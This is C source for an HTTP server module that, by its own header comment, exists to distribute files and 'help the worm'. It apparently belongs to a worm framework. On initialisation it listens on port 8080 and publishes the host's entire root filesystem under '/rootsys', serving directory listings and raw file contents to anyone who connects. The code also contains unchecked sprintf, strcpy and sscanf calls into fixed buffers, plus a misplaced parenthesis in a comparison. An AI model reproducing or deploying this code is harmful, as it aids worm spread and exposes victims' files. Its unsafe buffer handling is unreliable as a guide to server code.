/*
httpd - small web server..

to help distribute information, files, and help the worm

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netdb.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include <dirent.h>
#include <errno.h>
#include "list.h"
#include "structs.h"
#include "utils.h"
#include "httpd.h"

char *html_ctype = "text/html";
char *binary_ctype = "application/octet-stream";


typedef int (*http_func)(Modules *, Connection *, char *, int);

#define HTTP_TCP_TIMEOUT 15

Content *content_list = NULL;



// function declarations for httpd's requirements'
int httpd_incoming(Modules *, Connection *, char *buf, int size);
int httpd_plumbing(Modules *, Connection *, char *buf, int size);


ModuleFuncs httpd_funcs = {
    NULL, NULL, 
    &httpd_incoming,
    NULL,
    &httpd_plumbing,
    NULL, // no connect
    NULL // no disconnect
};

Modules ModuleHTTPD = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0, 0,
    // port, state
    8080, 0,
    // required 0, 0..  
    0, 1,
    //timer = 300 seconds (5min) - get new nodes, etc
    // httpd functions
    &httpd_funcs, NULL,
    NULL, NULL, NULL, 0
};

// customstate goes in connection->buf (for keeping track of brute force, etc)
typedef struct _http_custom_state {
    Content *content;
} HTTPCustomState;


HTTPCustomState *HTTP_CustomState_Ptr(Connection *cptr) {
    if (cptr->buf == NULL) {
        if ((cptr->buf = (char *)malloc(sizeof(HTTPCustomState) + 1)) == NULL)
            return NULL;
                
        memset(cptr->buf, 0, sizeof(HTTPCustomState));
    }
    
    return (HTTPCustomState *)cptr->buf;
}

int ContentDelete(char *uri) {
    int ret = 0;
    Content *cptr = ContentFindByName(uri);
    
    if (cptr != NULL) {
        L_del((LIST **)&content_list, (LIST *) cptr);
        ret = 1;
    }
    
    return ret;
}
Content *ContentAdd(char *filename, char *uri, char *data, int size, int type, char *content_type) {
    char *buf = NULL;
    Content *cptr = ContentFindByName(uri);
    
    if (cptr == NULL) {
        if (((cptr = (Content *)L_add((LIST **)&content_list, sizeof(Content))) == NULL) ||
                ((buf = (char *)malloc(size)) == NULL))
            return NULL;
    } else {
        // free the old data so we can replace
        if (cptr->data != NULL) {
            free(cptr->data);
            cptr->data = 0;
            cptr->data_size = 0;
        }
    }

    // use size 0 for adding dirs
    if (size != 0) {
        memcpy(buf, data, size);
    }

    if (filename != NULL)
        cptr->filename = strdup(filename);
        
    if (uri == NULL)
        uri = cptr->filename;
    else
        cptr->uri = strdup(uri);
        
    cptr->data_size = size;
    cptr->type = type;
    cptr->data = buf;
    cptr->content_type = content_type;
    
    return cptr;
}

int verify_buf_size(char **_buf, int *size, int need) {
    char *buf = NULL;
    int _size = 0;
    
    if (need < *size) return 1;
    _size = need + *size + 2048;
    
    if ((buf = (char *)malloc(_size + 1)) == NULL)
        return -1;
        
    memset(buf, 0, _size);
    
    if (*size > 0) {
        memcpy(buf, *_buf, *size);
    
        free(*_buf);
    }
    
    *_buf = buf;
    *size = _size;
    
    return 1;
}

Content *ContentFile(Content *sptr, char *uri);

// generates a one time content entry relating to a directory..
Content *ContentDirectory(Content *sptr, char *uri) {
    DIR *dp = NULL;
    struct dirent *de;
    Content *cptr = NULL;
    char *buf = NULL;
    int buf_size = 0;
    struct stat stv;
    char fmt[]="<html><head><title>%s</title></head><body><h3>%s</h3><br>";
    char longfile[1024], clientlong[1024];
    int need = strlen(fmt) + (strlen(sptr->uri) * 3);
    char dirname[1024];
    char *dptr = NULL;
    
    bzero(dirname, 1024);
 
    // initialize buffer
    if (verify_buf_size(&buf, &buf_size, need + 1024) == -1) return NULL;
    sprintf(buf, fmt, uri, uri);
    
    // turn URI into filesystem name..
    dptr = (char *)(uri+strlen(sptr->uri));
    if (sptr->filename)
    strcpy(dirname, sptr->filename);
    // copy over the rest of the URI
    if (strlen(dptr))
        strcat(dirname, dptr);
    
    stat(dirname, &stv);
    
    // if its not a directory.. try as a file
    if (!S_ISDIR(stv.st_mode)) {
        return ContentFile(sptr, uri);
    }
    if ((dp = opendir(dirname)) == NULL) return NULL;
    
    while (de = readdir(dp)) {
        if (verify_buf_size(&buf, &buf_size, need + 1024) == -1)
            return NULL;
            
        sprintf(longfile, "%s/%s", dirname, de->d_name);
        stat(longfile, &stv);
        sprintf(clientlong, "%s/%s", uri, de->d_name);
        sprintf(buf + strlen(buf), "<a href=\"%s\">%s</a> %s<br>", clientlong, de->d_name, S_ISDIR(stv.st_mode) ? "[DIR]":"");
    }
    
    strcat(buf, "</body></html>");
    
    closedir(dp);
    
    if ((cptr = (Content *)malloc(sizeof(Content))) != NULL) {
        memset(cptr, 0, sizeof(Content));
        
        cptr->data = buf;
        cptr->data_size = strlen(buf);
        cptr->content_type = html_ctype;
        cptr->temporary = 1;
        
        return cptr;
    }
    
    return NULL;
}

Content *ContentFile(Content *sptr, char *filename) {
    char *buf = NULL;
    int size = 0;
    Content *cptr = NULL;
    struct stat stv;
    FILE *ifd = NULL;
    int i = 0;
    char *dptr = NULL;

    if ((ifd = fopen(filename, "rb")) == NULL) {
        return NULL;
    }
    
    fstat(fileno(ifd), &stv);

    buf = (char *)malloc(stv.st_size + 1);
    if (buf != NULL) {
        i = fread(buf, 1, stv.st_size, ifd);
        
        if (i == stv.st_size) {
            if ((cptr = (Content *)malloc(sizeof(Content) + 1)) != NULL) {
                memset(cptr, 0, sizeof(Content));
                
                cptr->data = buf;
                buf = NULL;
                cptr->data_size = stv.st_size;
                cptr->temporary = 1;
                cptr->content_type = binary_ctype;
            }
        }
    }
    
    fclose(ifd);
    
    if (buf != NULL) free(buf);
    
    return cptr;
}

// adds a static file from the filesystem into httpd server
int ContentAddFile(char *filename, char *uri, char *ctype) {
    FILE *fd;
    char *buf = NULL;
    struct stat stv;
    int i = 0;
    int ret = -1;
    
    if ((fd = fopen(filename, "rb")) == NULL)
        return ret;
        
    fstat(fileno(fd), &stv);
    
    if ((buf = (char *)malloc(stv.st_size + 1)) == NULL)
        return ret;
    
    if ((i = fread(buf, 1, stv.st_size, fd)) == stv.st_size) {
        ret = (ContentAdd(filename, uri, buf, stv.st_size, TYPE_STATIC, ctype) != NULL);
    }
    
    fclose(fd);

    return (ret == 1 ? 1 : -1);    
}


// finds internal data relating to a URI
// calls functions to generate them for directory type..
Content *ContentFindByName(char *filename) {
    Content *cptr = content_list;
    Content *cnew = NULL;
    
    while (cptr != NULL) {
        if (cptr->type == TYPE_STATIC) {
            if (cptr->filename && (strncmp(filename, cptr->uri, strlen(cptr->uri) == 0))) {
                break;
            }
        }
        
        if (cptr->type == TYPE_DIRECTORY) {
            if (cptr->uri) {
                if (strncmp(filename, cptr->uri, strlen(cptr->uri)) == 0) {
                    cnew = ContentDirectory(cptr, filename);
                    if (cnew != NULL) cptr = cnew;
                    break;
                }
            }
        }
            
        cptr = cptr->next;
    }
    
    return cptr;
}

// stop listening on a port..
int httpd_unlisten(int port) {
    int ret = 0;
    Connection *cptr = ModuleHTTPD.connections;
    while (cptr != NULL) {
        if (cptr->state == TCP_LISTEN && cptr->port == port) {
            L_del((LIST **)&ModuleHTTPD.connections, (LIST *)cptr);
            ret = 1;
            break;
        }
        cptr = cptr->next;
    }
    return ret;
}

// listen on a port for httpd
int httpd_listen(int port) {
    
    Connection *cptr = tcp_listen(&ModuleHTTPD, port);
    return (cptr != NULL);
}

// initializes the HTTPD server
int httpd_init(Modules **list) {
    Module_Add(list, &ModuleHTTPD);
    
    // listen on a port
    tcp_listen(&ModuleHTTPD, ModuleHTTPD.listen_port);
    printf("port %d\n", ModuleHTTPD.listen_port);
    // initialize compiled in content arrangements    
    //ContentAddStatic("/index.html", "hello", 5, TYPE_STATIC, html_ctype);
    //ContentAddFile("/mnt/c/code/t.iso","/t.iso", "application/octet-stream");    
    ContentAdd("/","/rootsys", NULL, 0, TYPE_DIRECTORY,  NULL);
    
    return 0;
}


// generic return function.. base taken from http.c (Tiny http server)
int httpd_error(Modules *mptr, Connection *cptr, char *cause, char *_errno, char *shortmsg, char *longmsg) {
    int ret = 0;
    
    sock_printf(mptr, cptr, "HTTP/1.1 %s %s\n", _errno, shortmsg);
    sock_printf(mptr, cptr, "Content-type: text/html\n");
    sock_printf(mptr, cptr, "\r\n");
    sock_printf(mptr, cptr, "<html><title>HTTP Error</title>");
    sock_printf(mptr, cptr, "<body bgcolor=""ffffff"">\n");
    sock_printf(mptr, cptr, "%s: %s\n", _errno, shortmsg);
    sock_printf(mptr, cptr, "<p>%s: %s\n", longmsg, cause);
    sock_printf(mptr, cptr, "<hr><em>HTTPD</em>\n");
    
    cptr->state = TCP_CLOSE_AFTER_FLUSH;
    
    return 1;  
}

int httpd_bad(Modules *mptr, Connection *cptr, char *method) {
    httpd_error(mptr, cptr, method, "501", "Not Implemented", "Not implemented");
    
    return 1;
}

//sscanf(buf, "%s %s %s\n", method, uri, version);
int httpd_state_method(Modules *mptr, Connection *cptr, char *buf, int size) {
    char method[32];
    char uri[1024];
    char version[32];
    Content *nptr = NULL;
    HTTPCustomState *sptr = HTTP_CustomState_Ptr(cptr);
        
    sscanf(buf, "%32s %1024s %32s", method, uri, version);
    
    if ((strlen(version) > 2) && strcasestr(method, "GET") != NULL) {
        nptr = ContentFindByName(uri);
        if (nptr != NULL) {
            cptr->state = HTTP_STATE_HEADERS;
            sptr->content = nptr;
            
            return 1;
        } else {
            httpd_error(mptr, cptr, uri, "404", "Not Found", "Couldnt find the file");
            
            return 1;   
        }
    } else {
        httpd_bad(mptr, cptr, method);
        return 1;
    }
    
    return 0;
}

// we just have to wait for the client's headers to complete.. then we distribute the file!'
int httpd_state_headers(Modules *mptr, Connection *cptr, char *buf, int size) {
    HTTPCustomState *sptr = HTTP_CustomState_Ptr(cptr);
    
    
    if ((buf[0] != '\r' && buf[1] != '\n')) {
        return 1;
    }
            
    // should be done once we see \r\n..
    sock_printf(mptr, cptr, "HTTP/1.1 200 OK\n");
    sock_printf(mptr, cptr, "Server: HTTP Server\n");
    sock_printf(mptr, cptr, "Content-length: %d\n", sptr->content->data_size);
    sock_printf(mptr, cptr, "Content-type: %s\n", sptr->content->content_type);
    sock_printf(mptr, cptr, "\r\n");
    
    // add the actual data now..
    QueueAdd(mptr, cptr, NULL, sptr->content->data, sptr->content->data_size);
    
    if (sptr->content->temporary) {
        // remove the content since its a temporary one..
        //L_del((LIST **)&content_list, (LIST *)sptr->content));
        free(sptr->content->data);
        free(sptr->content);
        
        sptr->content = NULL;
    }
    // set to wait 20 seconds after.. just so we are sure the client receives it all before we close..
    cptr->state = TCP_CLOSE_AFTER_FLUSH;
    
    // we wanna remove the entire incoming line .. so lets
    // make it believe it wasnt chopped so it gets removed :)
    cptr->incoming->chopped = 0;
    
    return 1;
}

// incoming parser for httpd data
int httpd_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    int i = 0;
    int ret = 0;
    struct _http_states {
        int state;
        http_func function;
    } http_state[] = {
        { TCP_CONNECTED, &httpd_state_method },
        { HTTP_STATE_HEADERS, &httpd_state_headers },
        { 0, NULL }
    };
    char *recv_line = NULL;
    int no_line = 0;
    int line_size = 0;
        
    // find the correct function for the current connection state
    for (i = 0; http_state[i].function != NULL; i++) {
        if (http_state[i].state == cptr->state) {
            while (cptr->incoming && cptr->incoming->size && (cptr->state == http_state[i].state)) {
                no_line = 0;
                recv_line = QueueParseAscii(cptr->incoming, &line_size);
                if (!recv_line && cptr->incoming && cptr->incoming->buf) {
                    recv_line = cptr->incoming->buf;
                    line_size = cptr->incoming->size;
                    no_line = 1;
                }
                
                if (recv_line) {
                    // execute correct function
                    ret = http_state[i].function(mptr, cptr, recv_line, line_size);
                }
                
                if (!no_line) {
                    free(recv_line);
                }
                //if (ret == 1) break;
            }
                        
            break;
        }
    }
    
    return ret;
}

int httpd_plumbing(Modules *mptr, Connection *conn, char *buf, int size) {
    Connection *cptr = NULL;
    int cur_ts = time(0);
    
    // kill connections that arent transferring files and are older than 15 seconds
    cptr = mptr->connections;
    while (cptr != NULL) {
        
        if (cptr->state == TCP_CLOSE_AFTER_FLUSH) {
            if (cptr->outgoing == NULL) {
                // close completed connections..
                ConnectionBad(cptr);
                break;
            }
        }
        // state != OK when transferring..
        if (!((cptr->state == STATE_OK) || (cptr->state == TCP_LISTEN) || (cptr->state == TCP_CLOSE_AFTER_FLUSH))) {
        
            if ((cur_ts - cptr->start_ts) > HTTP_TCP_TIMEOUT) {
                ConnectionBad(cptr);
            }
        }
        
        cptr = cptr->next;
    }
}